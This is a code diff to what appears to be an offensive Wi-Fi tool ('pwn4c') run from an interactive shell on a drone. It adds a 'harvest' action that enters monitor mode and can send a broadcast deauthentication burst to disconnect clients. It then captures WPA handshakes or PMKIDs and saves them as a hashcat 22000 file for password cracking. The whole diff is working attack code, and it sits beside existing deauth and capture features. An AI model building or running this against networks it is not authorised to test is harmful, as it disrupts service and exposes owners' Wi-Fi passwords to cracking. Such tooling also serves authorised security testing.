@@ -70,8 +70,8 @@ var shellCmd = &cobra.Command{
 	Use:   "shell [target_ip]",
 	Short: "Interactive menu for everything the drone can do, in one session",
 	Long: `Opens a single control session and drives the whole drone from a numbered
-menu — survey networks, pick one, join it, listen to it, deauth it — without
-juggling separate commands and reconnects.
+menu — survey networks, pick one, join it, listen to it, deauth it, harvest its
+handshake — without juggling separate commands and reconnects.
 
 Inside the menu, actions that need a network operate on the selected one
 (use 'networks' then 'use <#>').`,
@@ -110,10 +110,11 @@ const shellMenu = `
   6) leave        disconnect the drone from the upstream network
   7) listen       capture the selected network into a PCAP (Ctrl+C stops)
   8) deauth       deauth the selected network, then capture automatically
-  9) stop         stop monitor mode / hopping
- 10) hop          hop across channels (default 1,6,11)
- 11) power        set TX power (1-20 dBm)
- 12) reboot       reboot the drone
+  9) harvest      capture a crackable handshake/PMKID, write a hashcat file
+ 10) stop         stop monitor mode / hopping
+ 11) hop          hop across channels (default 1,6,11)
+ 12) power        set TX power (1-20 dBm)
+ 13) reboot       reboot the drone
   q) quit
 
 `
@@ -177,13 +178,15 @@ func (s *shellState) dispatch(line string) bool {
 		s.doListen(false)
 	case "8", "deauth":
 		s.doListen(true)
-	case "9", "stop":
+	case "9", "harvest":
+		s.doHarvest()
+	case "10", "stop":
 		s.doStop()
-	case "10", "hop":
+	case "11", "hop":
 		s.doHop(arg)
-	case "11", "power":
+	case "12", "power":
 		s.doPower(arg)
-	case "12", "reboot":
+	case "13", "reboot":
 		s.doReboot()
 	case "menu", "help", "h", "?":
 		// the menu prints every round already
@@ -275,7 +278,7 @@ func (s *shellState) doUse(arg string) {
 		label = fmt.Sprintf("<hidden network, BSSID %s>", pick.bssid)
 	}
 	fmt.Printf("[+] Selected: %s (BSSID %s, channel %d)\n", label, pick.bssid, pick.channel)
-	fmt.Println("    Available actions: connect · listen · deauth")
+	fmt.Println("    Available actions: connect · listen · deauth · harvest")
 }
 
 func (s *shellState) askYN(prompt string, defYes bool) bool {
@@ -564,6 +567,122 @@ func (s *shellState) doListen(deauth bool) {
 	s.stopMonitorQuietly()
 	fmt.Printf("[+] Capture saved: %s\n", outPath)
 	reportCapture(frames.Load())
+}
+
+// doHarvest captures a crackable handshake or PMKID and writes a hashcat 22000
+// file. It is the in-session twin of `pwn4c harvest`: same daemon table, same
+// output, but no reconnect and no exit — the shell keeps the radio as it found
+// it.
+func (s *shellState) doHarvest() {
+	channel := 6
+	bssid := ""
+
+	if s.selected != nil {
+		channel = s.selected.channel
+		bssid = s.selected.bssid
+		fmt.Printf("[*] Harvesting %s (BSSID %s, ch%d).\n",
+			s.selected.ssid, s.selected.bssid, s.selected.channel)
+	} else {
+		fmt.Printf("[*] No network selected — harvesting on channel %d without a BSSID filter.\n", channel)
+		fmt.Print("[*] Channel to harvest on (empty = 6): ")
+		v, err := s.readLine()
+		if err != nil {
+			return
+		}
+		if v = strings.TrimSpace(v); v != "" {
+			if ch, err := strconv.Atoi(v); err == nil && ch >= 1 && ch <= 13 {
+				channel = ch
+			} else {
+				fmt.Println("[!] Invalid channel — staying on 6.")
+			}
+		}
+	}
+
+	timeout := 120
+	fmt.Printf("[*] Give up after N seconds (empty = %d): ", timeout)
+	v, err := s.readLine()
+	if err != nil {
+		return
+	}
+	if v = strings.TrimSpace(v); v != "" {
+		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 3600 {
+			timeout = n
+		} else {
+			fmt.Printf("[!] Invalid timeout — using %ds.\n", timeout)
+		}
+	}
+
+	kick := false
+	if bssid != "" {
+		kick = s.askYN("[*] Kick associated clients with a deauth burst first?", false)
+	}
+
+	fmt.Print("[*] Output file (empty = hs.hc22000): ")
+	v, err = s.readLine()
+	if err != nil {
+		return
+	}
+	outPath := strings.TrimSpace(v)
+	if outPath == "" {
+		outPath = "hs.hc22000"
+	}
+
+	st, err := s.client.GetStatus()
+	if err != nil {
+		fmt.Printf("[!] %v\n", err)
+		return
+	}
+
+	weStarted := false
+	switch {
+	case !st.MonitorActive:
+		if err := s.client.StartMonitor(channel); err != nil {
+			fmt.Printf("[!] Failed to enter monitor mode: %v\n", err)
+			return
+		}
+		weStarted = true
+	default:
+		if st.Channel != channel {
+			if err := s.client.SetChannel(channel); err != nil {
+				fmt.Printf("[!] Failed to switch channel: %v\n", err)
+				return
+			}
+		}
+		// START_MONITOR clears the table; a channel switch does not, and a
+		// running session may already hold units from an earlier run.
+		if _, err := s.client.GetHandshakes(0, true); err != nil {
+			fmt.Printf("[!] Warning: failed to reset the handshake table: %v\n", err)
+		}
+	}
+
+	// A BSSID filter from an earlier listen session survives a monitor restart
+	// inside the daemon. Clear it so beacons from every AP are seen: the ESSID
+	// is required to build the hashcat line.
+	if err := s.client.SetFilter(false, ""); err != nil {
+		fmt.Printf("[!] Warning: failed to clear the frame filter: %v\n", err)
+	}
+
+	if kick {
+		fmt.Println("[*] Using a broadcast deauth — clients that ignore it will not re-handshake.")
+		runHarvestDeauth(s.client, bssid, "ff:ff:ff:ff:ff:ff", channel, 5)
+	}
+
+	units := collectHandshakes(s.client, channel, bssid, timeout, false)
+
+	// Only restore the radio if this action started the monitor session: a
+	// session the operator already had running stays up.
+	if weStarted {
+		s.stopMonitorQuietly()
+	}
+
+	if len(units) == 0 {
+		fmt.Println("[!] No handshake captured.")
+		printHarvestHints()
+		return
+	}
+	if err := writeHarvest(units, outPath); err != nil {
+		fmt.Printf("[!] %v\n", err)
+	}
 }
 
 // stopMonitorQuietly restores the radio after a listen session. Leaving monitor
